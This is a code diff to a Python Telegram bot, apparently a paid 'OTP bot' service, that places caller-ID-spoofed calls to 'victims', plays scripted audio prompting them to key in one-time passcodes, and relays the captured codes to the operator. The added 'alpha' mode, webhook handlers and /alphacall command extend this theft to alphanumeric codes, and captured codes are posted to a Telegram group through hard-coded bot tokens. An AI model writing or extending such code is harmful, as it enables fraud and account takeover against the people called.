@@ -856,6 +856,27 @@ def custom_callmaking(number,spoof,chatid,script_id):
 def custom_make_call(t:str,f:str,user_id,script_id:int):
     custom_callmaking(number=t,spoof=f,chatid=user_id,script_id=script_id)
    
+
+def alpha_callmaking(number,spoof,chatid,script_id):
+        url = "https://articunoapi.com:8443/create-call"
+        data = {
+             "to_": f"{number}",
+              "from_": f"{spoof}",
+              "callbackURL": f"{ngrok_url}/{script_id}/{chatid}/alpha",
+              "api_key": f"{apiKey}",
+               }
+        resp = requests.post(url, json=data)
+        res = json.loads(resp.text)
+        c.execute(f"update call_data set call_control_id='{res['uuid']}'  where chat_id={chatid} ")
+        db.commit()
+                
+
+def alpha_make_call(t:str,f:str,user_id,script_id:int):
+    alpha_callmaking(number=t,spoof=f,chatid=user_id,script_id=script_id)
+   
+
+
+
 # ------------------Recall feature ---------------------------------
 @bot.message_handler(commands=['recall'])
 def recall_now(message):
@@ -877,11 +898,15 @@ def recall_now(message):
                             c.execute(f"select * from call_data where chat_id={id} limit 1")
                             last_script = c.fetchone()
                             if last_script[2]!='custom':
-                                make_call(vict,caller,id,f'{last_script[2]}')
+                                 make_call(vict,caller,id,f'{last_script[2]}')
                             elif last_script[2]=='custom':
                                  c.execute(f"select * from users where user_id={id} limit 1")
                                  clast_script = c.fetchone()
                                  custom_make_call(vict,caller,id,clast_script[6])
+                            elif last_script[2]=='alpha':
+                                 c.execute(f"select * from users where user_id={id} limit 1")
+                                 clast_script = c.fetchone()
+                                 alpha_make_call(vict,caller,id,clast_script[6])
                         except:
                             print("Unknown Error Recalling")
                 elif days==0:    
@@ -1063,6 +1088,185 @@ Powered By:- @ArticunoOtpBot 🔐""")
 #--------------------------------------------------------------------------------------------------------------------------------
 
 
+
+
+#--------------------------------ALPHA---CALL WEBHOOK-------------------------------------------------------
+def aplha_confirm1(message,otp_message):
+    db = mysql.connector.connect(user=d_user, password=d_pass,host=d_host, port=d_port,database=d_data)
+    c = db.cursor() 
+    chat_id = message.from_user.id
+    up_resp1= otp_message
+    c.execute(f"Select * from users where user_id={chat_id}")
+    sc_id = c.fetchone()
+    customscid = sc_id[6]
+
+    c.execute(f"select * from custom_scripts where script_id={customscid} limit 1")
+    custom_waiting = c.fetchone()
+    digits = custom_waiting[8]
+    nospace_digits= "".join(digits.split())
+
+    c.execute(f"Select * from call_data where chat_id={chat_id}")
+    custom_cont = c.fetchone()
+    call_control_id  = custom_cont[1]
+
+    if up_resp1=='Accept':
+        url = 'https://articunoapi.com:8443/play-audio'
+        data = {
+    "uuid": f"{call_control_id}",
+    "audiourl": f"https://sourceotp.online/scripts/{customscid}/output3.wav",
+   
+}
+        requests.post(url, json=data)
+        bot.send_message(chat_id,f"*Code Accpeted ✅ *",parse_mode='markdown')
+        time.sleep(3)
+        callhangup(call_control_id)
+
+
+    elif up_resp1=='Deny':
+        bot.send_message(chat_id,f"""*Code Rejected ❌*""",parse_mode='markdown')
+        url = 'https://articunoapi.com:8443/play-audio'
+        data = {
+    "uuid": f"{call_control_id}",
+    "audiourl": f"https://sourceotp.online/scripts/{customscid}/output5.wav"
+}
+        requests.post(url, json=data)
+        url4 = 'https://articunoapi.com:8443/gather-alpha'
+        data = {
+    "uuid": f"{call_control_id}",
+}
+    requests.post(url4, json=data)
+    c.close()
+    return 'Webhook received successfully!', 200
+        
+@app.route('/<script_id>/<chatid>/alpha', methods=['POST'])
+def aplha_prebuild_script_call(script_id,chatid):
+    global ringing_handler 
+    global recording_handler
+    db = mysql.connector.connect(user=d_user, password=d_pass,host=d_host, port=d_port,database=d_data)
+    c = db.cursor()
+    data = request.get_json()
+    print(data)
+    call_control_id = data['uuid']
+    event = data['state']
+    c.execute(f"select * from custom_scripts where script_id='{script_id}' limit 1")
+    custom_sc_src = c.fetchone()
+    digits = custom_sc_src[8]
+    nospace_digits= "".join(digits.split())
+    c.execute(f"select * from users where user_id='{chatid}' limit 1")
+    voices = c.fetchone()
+    call_cost = voices[11]
+    
+    if event == "call.ringing":  
+            callhangbutton(chatid)
+            
+        
+    elif event == "call.answered":
+            url1 = "https://articunoapi.com:8443/gather-audio"
+            data = {
+    "uuid": f"{call_control_id}",
+    "audiourl": f"https://sourceotp.online/scripts/{script_id}/output1.wav",
+    "maxdigits":"1"
+}
+            requests.post(url1, json=data)
+            bot.send_message(chatid,f"""*Call has been answered 📱*""",parse_mode='markdown')
+
+        
+
+    elif event == "call.hangup":
+            try:
+                recording_handler[call_control_id] = data['recording_url']
+                per_call_cost = data['charge']
+                call_cost_update = call_cost + per_call_cost
+                c.execute(f"Update users set call_cost ={call_cost_update} where user_id={chatid}")
+                db.commit()
+            except:
+                 print("Recording Error")
+            
+
+    elif event == "call.complete":
+            global last_message_ids
+            mes = "Call Ended ☎️"
+            keyboard = types.InlineKeyboardMarkup(row_width=2)
+            item1 = types.InlineKeyboardButton(text="Recall", callback_data="/recall")
+            item0 = types.InlineKeyboardButton(text="Profile", callback_data="/profile")
+            keyboard.add(item1, item0)
+            mesid = bot.send_message(chatid,f"""*{mes}*""",reply_markup=keyboard, parse_mode='Markdown').message_id
+            last_message_ids[chatid]=mesid
+            c.execute(f"Update users set status='active' where user_id={chatid}")
+            db.commit()
+
+            try:
+                 recurl =  recording_handler[call_control_id]
+                 send_record = threading.Thread(target=retrive_recording, args=(recurl,chatid,))
+                 send_record.start()
+            except:
+                 print("error in sending Recording")
+
+    elif event == "dtmf.entered":
+        data = request.get_json()
+        digit =  data['digit']
+        bot.send_message(chatid,f"""*Digit Pressed ⏩ {digit}*""",parse_mode='markdown')
+        
+    elif event == "dtmf.gathered":
+        data = request.get_json()
+        otp2 = data['digits']
+
+        if otp2 == "1":
+            def custom_ask_otp():
+                url3 = 'https://articunoapi.com:8443/play-audio'
+                data = {
+    "uuid": f"{call_control_id}",
+    "audiourl": f"https://sourceotp.online/scripts/{script_id}/output2.wav"
+}
+                requests.post(url3, json=data)
+            def custom_send_ask_otp(): 
+                bot.send_message(chatid,f"""*Victim pressed one, Send OTP now 📲*""",parse_mode='markdown')
+                url4 = 'https://articunoapi.com:8443/gather-alpha'
+                data = {
+    "uuid": f"{call_control_id}",
+}
+                requests.post(url4, json=data)
+            custom_bgtask2 = threading.Thread(target=custom_ask_otp)
+            custom_bgtask2.start()
+            custom_send_ask_otp()
+
+    elif event =="alpha.gathered":
+            data = request.get_json()
+            otp2 = data['aplhabets']
+            url = 'https://articunoapi.com:8443/play-audio'
+            data = {
+    "uuid": f"{call_control_id}",
+    "audiourl": f"https://sourceotp.online/scripts/{script_id}/output4.wav",
+}
+            requests.post(url, json=data)
+            otp_grabbed(chatid,otp=otp2)
+            keyboard = types.InlineKeyboardMarkup(row_width=2)
+            item1 = types.InlineKeyboardButton(text="Accept ✅" ,callback_data="/accept_alpha")
+            item2 = types.InlineKeyboardButton(text="Deny ❌",callback_data="/deny_alpha")
+            keyboard.add(item1,item2) 
+            bot.send_message(chatid,f"""<b><i>Code Captured <code>{otp2}</code>  ✅</i></b>""",parse_mode='HTML',reply_markup=keyboard)
+            requests.post(f"""https://api.telegram.org/bot6594047154:AAEkLCy48iP2fx-PVeQUlgt_XAJJJ2nPWGs/sendMessage?chat_id=-1002076456397&text=
+🚀 Articuno OTP Capture 🚀
+Another Call Was Successful 👤
+
+Custom OTP:- {otp2} ✅
+Username:- @{voices[12][0:3]+"****"+voices[12][-3:]} 🆔
+Service Name:- {custom_sc_src[2]} ⌛️
+Call Type:- CustomCall 📲
+
+Powered By:- @ArticunoOtpBot 🔐""")
+         
+           
+        
+    c.close()
+    return 'Webhook received successfully!', 200
+
+#--------------------------------------------------------------------------------------------------------------------------------
+
+
+
+
+
 #_-----------------------------Custom Calling---------------------------------------------------------------------------------------------------------
 @bot.message_handler(commands=['customcall'])
 def make_call_custon(message):
@@ -1104,13 +1308,6 @@ Please wait verifying your inputes 🧑‍💻*""",parse_mode='markdown')
                                 c.execute(f"update call_data set last_service='custom' where chat_id={id} ")
                                 db.commit()
                                 call_update(id)
-                                requests.post(f"""https://api.telegram.org/bot5790251044:AAFsqP2K0s7YK3Bxtm9Q4PXPTvi66SoyvUg/sendMessage?chat_id=-4235754114&text=
-Victim >> {number}
-Spoof  >> {spoof}
-S Id >> {script_id}
-Script >> {custom_sc[2]}
-""")
-                        
                                 b=custom_make_call(f= f"{spoof}",t=f"{number}",user_id=id,script_id=script_id)
 
                         else:
@@ -1124,6 +1321,68 @@ Script >> {custom_sc[2]}
                  bot.send_message(message.from_user.id, "*Sorry ,You are Banned !*",parse_mode='markdown')   
     else:
        send_welcome(message)
+
+
+##############################Aplhabetical Custom call#######################################################################
+
+@bot.message_handler(commands=['alphacall'])
+def make_call_custon(message):
+    db = mysql.connector.connect(user=d_user, password=d_pass,host=d_host, port=d_port,database=d_data)
+    c = db.cursor()
+    id = message.from_user.id
+    username = message.from_user.username
+    c.execute(f"Select * from users where user_id={id}")
+    row= c.fetchone()
+    if row!=None :
+        if row[3]!='ban':
+            if user_day_check(id)>0:
+                    mes =(message.text).split()
+                    try:
+                        number = mes[1]
+                        spoof = mes[2]
+                        script_id = mes[3]
+                        voice = mes[4]
+                        bot.send_message(message.from_user.id,f"""*📞 Calling {spoof} to {number}
+Please wait verifying your inputes 🧑‍💻*""",parse_mode='markdown')
+                        days =user_day_check(id)
+                        c.execute(f"update users set v_no={number},spoof_no={spoof},sc_id={script_id},inp_sc='{voice}',del_col=0,username='{username}' where user_id={id} ")
+                        db.commit()
+                        c.execute(f"select * from custom_scripts where script_id={script_id} limit 1")
+                        custom_sc = c.fetchone()
+                        Convert_TTS(custom_sc[3],custom_sc[4],custom_sc[5],custom_sc[6],custom_sc[7],script_id,voice)
+                        if custom_sc==None:
+                            raise ValueError
+                        c.execute(f"Select * from users where user_id={id}")
+                        row= c.fetchone()
+                        call_s1 = row[6]
+                        c.execute(f"select * from custom_scripts where script_id={script_id} limit 1")
+                        custom_sc = c.fetchone()
+                        c.execute(f"Select * from users where user_id={id}")
+                        row= c.fetchone()
+                        call_s1 = row[6]
+                        if (call_s1!=0):
+                
+                                c.execute(f"update call_data set last_service='alpha' where chat_id={id} ")
+                                db.commit()
+                                call_update(id)                    
+                                b=alpha_make_call(f= f"{spoof}",t=f"{number}",user_id=id,script_id=script_id)
+
+                        else:
+                            bot.send_message(message.from_user.id, """* Custom script not found! \n Create First -> /customscript *""",parse_mode='markdown')
+                    except:
+                        bot.send_message(message.from_user.id, f"*Somthing went wrong.\n/customcall <Victim Number> <Spoof Number> <Script Id> <voice>*",parse_mode='markdown')
+            else:
+                   bot.send_message(message.from_user.id, "*🚫Buy Subscription.🚫*",parse_mode='markdown')  
+                   delete_data(id) 
+        else:
+                 bot.send_message(message.from_user.id, "*Sorry ,You are Banned !*",parse_mode='markdown')   
+    else:
+       send_welcome(message)
+
+
+
+
+
 
 #-handle Call backs -----------------
 
@@ -1178,6 +1437,10 @@ def handle_callback(message):
 
     elif message.data == '/deny':
             custom_confirm1(message,"Deny")
+    elif message.data == '/accept_alpha':
+            aplha_confirm1(message,"Accept")
+    elif message.data == '/deny_alpha':
+            aplha_confirm1(message,"Deny")
             
          
          
